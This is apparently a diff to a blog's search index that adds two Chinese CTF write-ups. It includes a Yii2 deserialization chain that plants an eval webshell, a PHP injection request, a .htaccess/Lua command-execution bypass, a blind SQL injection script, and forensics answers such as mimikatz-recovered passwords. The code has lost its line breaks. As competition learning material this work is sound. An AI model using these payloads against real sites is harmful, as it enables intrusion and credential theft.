@@ -3763,4 +3763,181 @@ mdk3 mon0 b -f wifi.lst
         <tag>fakewifi</tag>
       </tags>
   </entry>
+  <entry>
+    <title>第四届红帽杯网络安全大赛Writeup</title>
+    <url>/2021/05/09/hmb/</url>
+    <content><![CDATA[Misc签到EBCDIC解码得到flag
+
+colorful codedata2三个一组转RGB，然后data1里的数字就是对应的RGB的位置，然后根据data1的字符数量分解质因数得到宽高，最后画图去npiet解
+
+附上脚本：
+from PIL import Imageimport matplotlib.pyplot as plt f1 = open(&#x27;data1&#x27;)c1 = f1.read()c1 = c1.split(&#x27; &#x27;)print(c1)print(len(c1)) f = open(&#x27;data2&#x27;,&#x27;rb&#x27;)c = f.read()res = []for i in range(len(c)//3):    yyy = c[i*3:i*3+3]    r,g,b = yyy[0],yyy[1],yyy[2]    res.append((r,g,b))print(len(res))print(res) rr = []for i in c1[:-1]:    rr.append(res[int(i)])print(rr)a = 191b = 37img = Image.new(&#x27;RGB&#x27;,(b,a),(255,255,255))for j in range(b):    for i in range(a):        img.putpixel((j,i),rr[i+j*a])plt.imshow(img)img.save(&#x27;flag.png&#x27;)
+
+Webfind_it发送个get请求（//?code=&lt;?=phpinfo();?&gt;），然后访问hack.php即可得到flag
+
+framework反序列化
+&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#x27;assert&#x27;;            $this-&gt;id = &#x27;file_put_contents(&quot;php://filter/write=convert.base64-decode/resource=/var/www/html/web/assets/5118a5d1/fonts/b.php&quot;,&quot;PD9waHAgZXZhbCgkX0dFVFthXSk7Pz4K&quot;)&#x27;;            $this-&gt;modelClass=&#x27;DynamicModel&#x27;;            $this-&gt;scenario=&#x27;111&#x27;;        &#125;    &#125;&#125; namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            $this-&gt;formatters[&#x27;close&#x27;] = [new CreateAction(), &#x27;run&#x27;];        &#125;    &#125;&#125; namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader = new Generator;        &#125;    &#125;&#125; namespace&#123;    echo base64_encode(serialize(new yii\db\BatchQueryResult));&#125;?&gt; #http://eci-2zeab1jn4vnk38xn572o.cloudeci1.ichunqiu.com/index.php?r=site%2Fabout&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6NDp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjE1MToiZmlsZV9wdXRfY29udGVudHMoInBocDovL2ZpbHRlci93cml0ZT1jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9L3Zhci93d3cvaHRtbC93ZWIvYXNzZXRzLzUxMThhNWQxL2ZvbnRzL2IucGhwIiwiUEQ5d2FIQWdaWFpoYkNna1gwZEZWRnRoWFNrN1B6NEsiKSI7czoxMDoibW9kZWxDbGFzcyI7czoxMjoiRHluYW1pY01vZGVsIjtzOjg6InNjZW5hcmlvIjtzOjM6IjExMSI7fWk6MTtzOjM6InJ1biI7fX19fQ==
+
+接着构造payload：
+http://eci-2zeab1jn4vnk38xn572o.cloudeci1.ichunqiu.com/assets/5118a5d1/fonts/harvey.php?a=eval($_POST[harvey]); 
+
+然后蚁剑成功连接，发现ua绕过保护执行命令，参考西湖论剑_web1.docx；
+分别上传 .htaccess 和 3.lua 
+AddHandler lua-script .luarequire &quot;string&quot; --[[     This is the default method name for Lua handlers, see the optional     function-name in the LuaMapHandler directive to choose a different     entry point.--]]function handle(r)    r.content_type = &quot;text/plain&quot;    r:puts(&quot;Hello Lua World!\n&quot;)    local t = io.popen(&#x27;/readflag&#x27;)    local a = t:read(&quot;*all&quot;)    r:puts(a)    if r.method == &#x27;GET&#x27; then        for k, v in pairs( r:parseargs() ) do            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )        end    else        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)    endend
+
+最后去访问 3.lua 即可得到flag
+
+WebsiteMangersql盲注
+import requests url=&#x27;http://eci-2zeg1tmyhxfbqrmxi9m1.cloudeci1.ichunqiu.com/image.php?id=3&#x27;payload=&#x27;^((ascii(substr((select(group_concat(password))from(users)),&#123;&#125;,1)))=&#123;&#125;)&#x27;s=&#x27;1234567890abcdef&#x27; for i in range(1,30):    for b in s:        payloads=payload.format(i,ord(b))        a=requests.get(url+payloads)        #print(url+payloads)        if len(a.text)&lt;19000:            print(b)            break        else:            pass
+
+跑下脚本得到密码：dd6005ef9c77d5ae820ba；进而成功登录
+然后ssrf，file:&#x2F;&#x2F;&#x2F;flag得到flag
+
+
+Crypto（原题）primegame源自Baby Bubmi的wp：http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/
+附上脚本：
+import mathfrom decimal import *import randomimport struct getcontext().prec = int(100) primes = [2]for i in range(3, 100):    f = True    for j in primes:        if i * i &lt; j:            break        if i % j == 0:            f = False            break    if f:        primes.append(i) keys = []for i in range(len(primes)):    keys.append(Decimal(int(primes[i])).ln()) arr = []for v in keys:    arr.append(int(v * int(16) ** int(64))) ct = 597952043660446249020184773232983974017780255881942379044454676980646417087515453 def encrypt(res):    h = Decimal(int(0))    for i in range(len(keys)):        h += res[i] * keys[i]     ct = int(h * int(16)**int(64))    return ct def f(N):    ln = len(arr)    A = Matrix(ZZ, ln + 1, ln + 1)    for i in range(ln):        A[i, i] = 1        A[i, ln] = arr[i] // N        A[ln, i] = 64     A[ln, ln] = ct // N     res = A.LLL()     for i in range(ln + 1):        flag = True        for j in range(ln):            if -64 &lt;= res[i][j] &lt; 64:                continue            flag = False            break        if flag:            vec = [int(v + 64) for v in res[i][:-1]]            ret = encrypt(vec)            if ret == ct:                print(N, bytes(vec))            else:                print(&quot;NO&quot;, ret, bytes(vec)) for i in range(2, 10000):    print(i)    f(i)
+
+hpcurve源自 hxpCTF2020 的 hyper 的官方wp：https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup
+附上脚本：
+import itertoolsimport struct p = 10000000000000001119 R.&lt;x&gt; = GF(p)[]; y=xf = y + prod(map(eval, &#x27;yyyyyyy&#x27;))C = HyperellipticCurve(f, 0)J = C.jacobian()Ds = [J(C(x, min(f(x).sqrt(0,1)))) for x in (11,22,33)] enc = bytes.fromhex(&#x27;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;)known_pt = b&quot;a&quot;*20 + b&quot;flag&quot; rng_output = bytes(e^^m for e,m in zip(enc, known_pt)) blocks = [rng_output[i:i+8] for i in range(0, len(rng_output), 8)]ui = [int.from_bytes(r, &#x27;little&#x27;) for r in blocks]u = x^3 + ui[2]*x^2 + ui[1]*x + ui[0] L = GF(p).algebraic_closure()roots = [r[0] for r in u.change_ring(L).roots()] RR.&lt;zz&gt; = PolynomialRing(L)v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) for xi in roots])vi = [v.coefficients()[i].as_finite_field_element()[1] for i in range(3)]vi = [(int(-c), int(c)) for c in vi] for rs in itertools.product(*vi):    q = struct.pack(&#x27;&lt;&#x27;+&#x27;Q&#x27;*len(rs), *rs)     flag = bytes(k^^m for k,m in zip(2*(rng_output+q), enc))    print(flag)]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>红帽杯</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第六届“蓝帽杯”全国大学生网络安全技能大赛Writeup</title>
+    <url>/2022/07/09/lmb/</url>
+    <content><![CDATA[Miscdomainhacker
+公司安全部门，在流量设备中发现了疑似黑客入侵的痕迹，用户似乎获取了机器的hash，你能通过分析流量，找到机器的hash吗？flag格式：flag{hash_of_machine}
+附件下载 提取码（GAME）备用下载
+
+提取rar
+
+在流量中找到base64
+
+解码得到密码：SecretsPassw0rds
+
+最后得到机器的hash
+
+电子取证
+【电子取证部分场景加密附件，密码比赛当天给出】计算机取证.zip 下载：https://pan.baidu.com/s/1Unu92jvwT-AFXI0WIra84g 提取码：GAME md5值：7cbd6324eacbedf177fee722983abff4 ；手机取证.zip 下载：https://pan.baidu.com/s/1xnylfPDP1sw1nzze2V2s7A 提取码：GAME md5值：911d5f9572ec7d991a0531400f522011
+
+手机取证_1
+现对一个苹果手机进行取证，请您对以下问题进行分析解答。
+627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？（答案参考格式：1920x1080）
+附件下载地址见平台公告，解压密码为0ba6b2c094cbb3a04681a135487a19cb
+
+搜索对应图片得知图片的分辨率是360x360
+
+手机取证_2
+姜总的快递单号是多少？（答案参考格式：abcABC123）
+
+搜索姜总，在聊天记录中得知快递单号是SF1142358694796
+
+计算机取证_1
+现对一个windows计算机进行取证，请您对以下问题进行分析解答。
+从内存镜像中获得taqi7的开机密码是多少？（答案参考格式：abcABC123）
+附件下载地址见平台公告，解压密码为93ce7ea39bdd7baa137f1e9b963b7ee5
+
+通过mimikatz插件得到taqi7的开机密码是anxinqi
+
+计算机取证_2
+制作该内存镜像的进程Pid号是多少？（答案参考格式：1024）
+
+pslist找到制作该内存镜像的进程MagnetRAMCaptu得知其Pid号是2192
+
+计算机取证_3
+bitlokcer分区某office文件中存在的flag值为？（答案参考格式：flag{abcABC123}）
+
+首先在dg中找到密钥：368346-029557-428142-651420-492261-552431-515438-338239
+
+通过取证大师打开很容易看到一个word和ppt文件以及密码本
+
+于是我们使用aopr字典攻击得到密码：287fuweiuhfiute
+
+打开即可得到flag
+
+计算机取证_4
+TrueCrypt加密中存在的flag值为？（答案参考格式：flag{abcABC123}）
+
+通过取证大师中的内存分析工具找到并导出truecrypt的key
+
+然后解密并导出压缩包文件，发现它加密了
+
+最后爆破zip密码进而得到flag：flag{1349934913913991394cacacacacacc}
+
+程序分析_1
+现已获取某个APP程序，请您对以下问题进行分析解答。
+本程序包名是？（答案参考格式：abc.xx.de）
+附件下载 提取码（GAME）备用下载
+
+
+程序分析_2
+本程序的入口是？（答案参考格式：abc.xx.de）
+
+
+程序分析_3
+本程序的服务器地址的密文是？（答案参考格式：abcABC123）
+
+通过工具GDA打开查找得到服务器地址的密文是aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6
+
+程序分析_4
+本程序实现安全检测的类的名称是？（答案参考格式：abcABC123）
+
+通过搜索安全得知类的名称是a
+
+网站取证_1
+据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。
+请从网站源码中找出木马文件，并提交木马连接的密码。（答案参考格式：abcABC123）
+附件下载 提取码（GAME）备用下载
+
+通过D盾扫描找到一句话的密码：lanmaobei666
+
+网站取证_2
+请提交数据库连接的明文密码。（答案参考格式：abcABC123）
+
+首先在database.php中找到数据库密码
+
+跳转过去后运行得到密码：KBLT123
+
+网站取证_3
+请提交数据库金额加密混淆使用的盐值。（答案参考格式：abcABC123）
+
+在bak.sql中可以发现它通过 tab_channel_order_list 来存储数据库金额
+
+然后全局搜索一下进而找到使用的盐值：jyzg123456
+
+第五届“蓝帽杯”全国大学生网络安全技能大赛Ball_sigin滑雪也能玩出新花样？
+我还是老老实实打游戏得flag⑧
+
+原来改JS也行耶（treeBg.x &#x3D; 1;  把树的随机生成改掉就能让他站到一旁
+
+冬奥会_is_coming
+冰墩墩真可爱！ 附件（提取码：lje3）
+
+解压出来一张图片，直接 binwalk+foremost 得到一个音频的包，cat一下发现一串疑似emoji-aes的表情
+
+这里我们根据提示八位数字再加上题目冬奥会想到应该是冬奥会开始的时间20220204，于是乎我们通过mp3stego去解密
+
+
+接着我们去掉\x和空格拿去hex解密得到：
+
+发现是**wingding字符**，解码得到关键信息：A︎G︎i︎t︎H︎u︎b︎r︎e︎po︎s︎i︎t︎o︎r︎y︎n︎a︎m︎e︎d︎1︎c︎e︎P︎e︎a︎ki︎s︎v︎e︎r︎y︎i︎n︎t︎e︎r︎e︎s︎t︎i︎n︎g︎.︎W︎h︎y︎n︎o︎t︎t︎a︎ke︎a︎l︎o︎o︎ka︎t︎i︎t︎?︎
+
+于是我们上GitHub搜索得到密钥：How_6ad_c0uld_a_1cePeak_be?
+
+最后**emoji-aes**解密得到flag
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>蓝帽杯</tag>
+      </tags>
+  </entry>
 </search>
